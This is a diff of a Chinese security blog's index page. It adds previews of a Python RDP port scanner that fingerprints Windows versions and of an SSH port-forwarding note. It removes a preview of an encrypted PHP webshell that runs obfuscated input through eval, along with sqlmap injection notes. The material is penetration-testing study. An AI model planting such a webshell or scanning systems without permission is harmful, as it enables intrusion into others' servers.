@@ -117,6 +117,278 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/02/28/3389-scan.html" >3389指纹扫描</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/02/16/ssh-port-forward.html" >SSH端口转发</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>以下几个原则：</p>
+<ul>
+<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
+<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
+<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
+<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
+</ul>
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
+<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
+<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
+<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
+<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
+	
+
+	</div>
+  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>以下几个原则：</p>
+<ul>
+<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
+<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
+<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
+<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
+</ul>
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
+<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
+<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
+<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
+<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
+	
+	</div>
+  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/02/02/mac-re.html" >IOS逆向入门</a>
 		</h3>
 		</div>
@@ -489,232 +761,6 @@ die();
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/01/04/加密webshell流量.html" >加密webshell流量</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-01-04  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-function easy_en($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
-        else $new &#x3D; $old -1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-function easy_de($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
-        else $new &#x3D; $old + 1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
-    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-&#x2F;&#x2F;    var_dump($c);
-    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
-        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
-        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
-        &#39;content&#39;&#x3D;&gt;$c),
-    ));
-    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
-&#x2F;&#x2F;    var_dump($c);
-    die(easy_de(base64_decode($c)));
-&#125;
-
-function shutdown() &#123;
-    $str &#x3D; ob_get_contents();
-    ob_end_clean();
-    echo base64_encode(easy_en($str));
-&#125;
-
-register_shutdown_function(&quot;shutdown&quot;);
-ob_start();
-$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
-eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
-?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-function easy_en($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
-        else $new &#x3D; $old -1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-function easy_de($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
-        else $new &#x3D; $old + 1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
-    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-&#x2F;&#x2F;    var_dump($c);
-    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
-        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
-        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
-        &#39;content&#39;&#x3D;&gt;$c),
-    ));
-    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
-&#x2F;&#x2F;    var_dump($c);
-    die(easy_de(base64_decode($c)));
-&#125;
-
-function shutdown() &#123;
-    $str &#x3D; ob_get_contents();
-    ob_end_clean();
-    echo base64_encode(easy_en($str));
-&#125;
-
-register_shutdown_function(&quot;shutdown&quot;);
-ob_start();
-$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
-eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
-?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/01/03/sql中转.html" >Sqlmap备忘录</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-01-03  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
-<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
-<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
-<blockquote>
-<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>###在注入测试的时候union查询用的是NULL?</p>
-<blockquote>
-<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
-</blockquote>
-<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
-<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
-<pre class="line-numbers language-none"><code class="language-none">--string
---not-string
-在true或者false要判断的字符
-
---regexp 使用的正则表达
---code 根据HTTP状态来判断
---text-only 比较回应的文本
---title 比较回应的title
-
-其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
-
---string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
-<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
-<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
-<blockquote>
-<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>###在注入测试的时候union查询用的是NULL?</p>
-<blockquote>
-<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
-</blockquote>
-<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
-<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
-<pre class="line-numbers language-none"><code class="language-none">--string
---not-string
-在true或者false要判断的字符
-
---regexp 使用的正则表达
---code 根据HTTP状态来判断
---text-only 比较回应的文本
---title 比较回应的title
-
-其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
-
---string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -766,7 +812,7 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+			<li><a href="/categories/Java/">Java<span>5</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -793,6 +839,14 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
+      </li>
+    
+      <li>
+        <a href="/2022/04/06/CVE-2022-22965.html" ><i class="fa fa-file-o"></i>CVE-2022-22965漏洞记录</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
       </li>
     
@@ -802,14 +856,6 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
     
       <li>
         <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
   </ul>
